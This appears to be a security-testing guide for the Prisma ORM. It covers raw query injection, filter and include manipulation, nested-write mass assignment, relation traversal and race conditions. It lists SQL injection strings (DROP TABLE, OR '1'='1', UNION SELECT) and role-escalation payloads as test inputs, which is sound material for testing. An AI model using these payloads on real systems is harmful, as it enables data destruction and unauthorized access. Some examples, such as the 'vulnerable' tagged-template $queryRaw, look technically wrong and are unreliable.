<prisma_security_guide>
<title>PRISMA ORM SECURITY TESTING</title>

<critical>Prisma is a modern TypeScript/JavaScript ORM used extensively in Node.js applications. While Prisma provides parameterized queries by default, security vulnerabilities arise from raw query usage, schema exposure, improper access control, and client configuration issues. Understanding Prisma's query patterns is essential for testing modern Node.js applications.</critical>

<scope>
- Raw query injection (prisma.$queryRaw, $executeRaw)
- Schema and model exposure
- Access control bypass via query manipulation
- Relation traversal attacks
- Transaction and concurrency issues
- Prisma Studio exposure
- Connection string leakage
- Batch operation abuse
</scope>

<methodology>
1. Identify Prisma usage patterns in the application.
2. Test for raw query injection vectors.
3. Probe for schema exposure and introspection.
4. Test access control on relations and nested queries.
5. Check for Prisma Studio and admin interface exposure.
</methodology>

<identification>
<prisma_indicators>
{% raw %}
# Prisma usage indicators in codebase:
# - prisma/ directory with schema.prisma
# - @prisma/client imports
# - PrismaClient instantiation
# - Prisma-specific error messages

# Error message patterns:
"PrismaClientKnownRequestError"
"PrismaClientValidationError"
"P2002: Unique constraint failed"
"P2025: Record not found"

# GraphQL + Prisma (common stack):
# Nexus, TypeGraphQL, Pothos integrations
{% endraw %}
</prisma_indicators>

<schema_exposure>
{% raw %}
# Prisma schema may be exposed via:
# - Git repository access
# - Deployment artifacts
# - GraphQL introspection (if schema reflects Prisma models)
# - Error messages revealing model structure

# Schema file locations:
/prisma/schema.prisma
/src/prisma/schema.prisma

# Generated types exposure:
/node_modules/.prisma/client/
/@prisma/client/
{% endraw %}
</schema_exposure>
</identification>

<raw_query_injection>
<queryraw_attacks>
{% raw %}
# $queryRaw and $queryRawUnsafe are vulnerable to injection:

# Vulnerable pattern:
const result = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = '${userInput}'
`;

# Safe pattern (with tagged template):
const result = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${userInput}
`;

# Attack vectors when concatenating:
userInput: "'; DROP TABLE users; --"
userInput: "' OR '1'='1"
userInput: "' UNION SELECT * FROM admin_users; --"

# $queryRawUnsafe (explicitly unsafe):
await prisma.$queryRawUnsafe(`SELECT * FROM ${table}`)
# Table name injection possible
{% endraw %}
</queryraw_attacks>

<executeraw_attacks>
{% raw %}
# $executeRaw for write operations:

# Vulnerable pattern:
await prisma.$executeRaw`
  UPDATE users SET role = '${role}' WHERE id = ${id}
`;

# Injection:
role: "admin'; --"
role: "user', admin = true WHERE id = 1; --"

# Bypassing Prisma's protections:
# If string concatenation used instead of tagged templates
{% endraw %}
</executeraw_attacks>
</raw_query_injection>

<query_manipulation>
<filter_bypass>
{% raw %}
# Prisma query filter manipulation:

# Original query:
await prisma.user.findMany({
  where: {
    teamId: userTeamId,
    ...userFilters  // User-controlled filters
  }
});

# Attack: Override teamId restriction
userFilters: { teamId: "other-team-id" }
userFilters: { OR: [{ teamId: "any" }] }

# Nested filter injection:
userFilters: {
  posts: {
    some: {
      published: true
    }
  }
}
{% endraw %}
</filter_bypass>

<select_include_abuse>
{% raw %}
# Abusing select/include for data leakage:

# If user controls include:
await prisma.user.findUnique({
  where: { id: userId },
  include: userControlledInclude
});

# Attack: Include sensitive relations
userControlledInclude: {
  password: true,
  apiKeys: true,
  payments: true,
  adminNotes: true
}

# Select hidden fields:
userControlledSelect: {
  hashedPassword: true,
  resetToken: true,
  ssn: true
}
{% endraw %}
</select_include_abuse>

<orderby_injection>
{% raw %}
# orderBy manipulation:

# If orderBy from user input:
await prisma.user.findMany({
  orderBy: userOrderBy
});

# Attack: Access relations via orderBy
userOrderBy: {
  password: 'asc'  // May reveal password exists
}

# Timing attack via orderBy:
userOrderBy: {
  secretField: 'asc'  // Different timing reveals data
}
{% endraw %}
</orderby_injection>
</query_manipulation>

<relation_attacks>
<nested_writes>
{% raw %}
# Prisma nested writes can bypass access control:

# Create with nested relations:
await prisma.user.create({
  data: {
    email: userInput.email,
    ...userInput  // User-controlled data
  }
});

# Attack: Create admin relationship
userInput: {
  email: "attacker@evil.com",
  role: { connect: { id: "admin-role-id" } },
  permissions: { set: ["admin", "superuser"] }
}

# Connect to unauthorized resources:
userInput: {
  team: { connect: { id: "target-team-id" } }
}
{% endraw %}
</nested_writes>

<relation_traversal>
{% raw %}
# Traverse relations for data access:

# If can specify relations:
await prisma.post.findMany({
  include: {
    author: {
      include: {
        privateMessages: true,
        billingInfo: true
      }
    }
  }
});

# Cross-tenant data access:
# Traverse from accessible record to inaccessible data via relations
{% endraw %}
</relation_traversal>
</relation_attacks>

<transaction_attacks>
<race_conditions>
{% raw %}
# Interactive transactions can have race conditions:

await prisma.$transaction(async (tx) => {
  const balance = await tx.account.findUnique({...});
  // Race window here
  await tx.account.update({...});
});

# Attack: Send concurrent requests to exploit check-use gap

# Isolation level issues:
await prisma.$transaction([...], {
  isolationLevel: 'ReadUncommitted'  // Weak isolation
});
{% endraw %}
</race_conditions>
</transaction_attacks>

